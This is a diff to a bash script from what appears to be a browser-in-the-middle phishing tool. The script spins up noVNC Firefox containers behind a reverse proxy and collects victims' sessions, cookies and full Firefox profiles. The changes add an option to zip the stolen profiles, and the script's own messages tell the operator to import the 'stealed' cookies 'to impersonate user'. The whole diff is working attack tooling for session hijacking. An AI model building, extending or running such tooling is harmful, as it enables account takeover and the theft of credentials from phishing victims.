@@ -12,10 +12,11 @@
 	   echo -e "\t -c Full path to the crt file of the ssl certificate"
 	   echo -e "\t -k Full path to the key file of the ssl certificate"
 	   echo -e "\t -a Adjust default user agent string"  
+	   echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
 	   exit 1 # Exit script after printing help
 	}
 	
-	while getopts "u:d:t:s:c:k:e:a:" opt
+	while getopts "u:d:t:s:c:k:e:a:z:" opt
 	do
 		case "$opt" in
 		u ) User="$OPTARG" ;;
@@ -26,6 +27,7 @@
 		c ) cert="$OPTARG" ;;
 		k ) key="$OPTARG" ;;
 		a ) useragent=$OPTARG ;;
+		z ) rzip=$OPTARG ;;
 		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
 		esac
 	done
@@ -68,6 +70,11 @@ case "$1" in
 		helpFunction
 	fi
 	
+	if [ -z "$rzip" ]
+	then
+		rzip=true
+	fi
+	
 	if [ -n "$SSL" ]
 	then
 		if [ -z "$cert" ] || [ -z "$key" ]
@@ -104,7 +111,7 @@ case "$1" in
 	for (( c=$START; c<=$END; c++ ))
 	do
 	    PW=$(openssl rand -hex 14)
-	    sudo docker run -dit -p690$c:6901 --name vnc-user$c -e VNC_PW=$PW vnc-docker &> /dev/null
+	    sudo docker run -dit -p690$c:6901 --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
 	    sleep 1
 	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
 	    sleep 1
@@ -183,7 +190,7 @@ case "$1" in
 	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
 	#Start a loop which copies the cookies from the containers
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
-	trap 'printf "\n[-] Import stealed session and cookie JSON to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
+	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
 	sleep 60
 	while :
 	do
@@ -198,14 +205,21 @@ case "$1" in
            sudo docker exec vnc-user$c sh -c "rm -f /home/headless/recovery.jsonlz4"
            sudo docker exec vnc-user$c sh -c "rm -f /home/headless/cookies.sqlite"
            sleep 2
-	   # Exporting the complete profiles for easier handling
-           mkdir -p user$c
-           docker exec vnc-user$c sh -c "ls /home/headless/.mozilla/firefox/" | while read line; do docker cp vnc-user$c:"/home/headless/.mozilla/firefox/$line" user$c/ ; done
            if [ -n "$OFormat" ]
 	   then
 		python3 ./session-collector.py ./user$c-recovery.jsonlz4 simple
 		python3 ./cookies-collector.py ./user$c-cookies.sqlite simple
 	   else
+		sudo docker exec vnc-user$c sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
+		sudo docker cp vnc-user$c:/home/headless/ffprofile ./phis$c-ffprofile
+		sudo docker exec vnc-user$c sh -c "rm -rf /home/headless/ffprofile"
+		sudo chown -R 1000 ./phis$c-ffprofile
+		
+		if [ "$rzip" = true ] 
+		then
+		   zip -r phis$c-ffprofile.zip phis$c-ffprofile/ &> /dev/null
+		   rm -r phis$c-ffprofile/
+		fi
 		python3 ./session-collector.py ./user$c-recovery.jsonlz4 default
 		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
 	   
